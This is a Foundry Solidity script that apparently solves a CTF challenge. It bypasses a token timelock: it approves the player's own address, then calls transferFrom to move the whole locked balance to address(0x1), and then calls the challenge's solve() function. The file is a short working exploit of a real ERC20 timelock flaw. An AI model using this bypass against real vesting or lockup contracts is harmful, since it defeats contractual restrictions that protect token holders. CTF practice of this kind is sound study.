// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Timelock.sol";
import "../src/Challenge.sol";

contract SolveScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address timelock = vm.envAddress("TIMELOCK");
        address challenge = vm.envAddress("CHALLENGE");
        
        vm.startBroadcast(deployerPrivateKey);
        
        Timelock token = Timelock(timelock);
        address player = vm.addr(deployerPrivateKey);
        
        uint256 balance = token.balanceOf(player);
        console.log("Player balance:", balance);
        
        // Step 1: Approve ourselves to spend our own tokens
        token.approve(player, balance);
        console.log("Approved:", balance);
        
        // Step 2: Use transferFrom to bypass the timelock
        // Transfer to any address (we'll use address(1) as burn)
        token.transferFrom(player, address(0x1), balance);
        console.log("Transferred via transferFrom!");
        
        // Step 3: Verify balance is 0
        uint256 newBalance = token.balanceOf(player);
        console.log("New balance:", newBalance);
        
        // Step 4: Call solve
        Challenge(challenge).solve();
        console.log("Challenge solved!");
        
        vm.stopBroadcast();
    }
}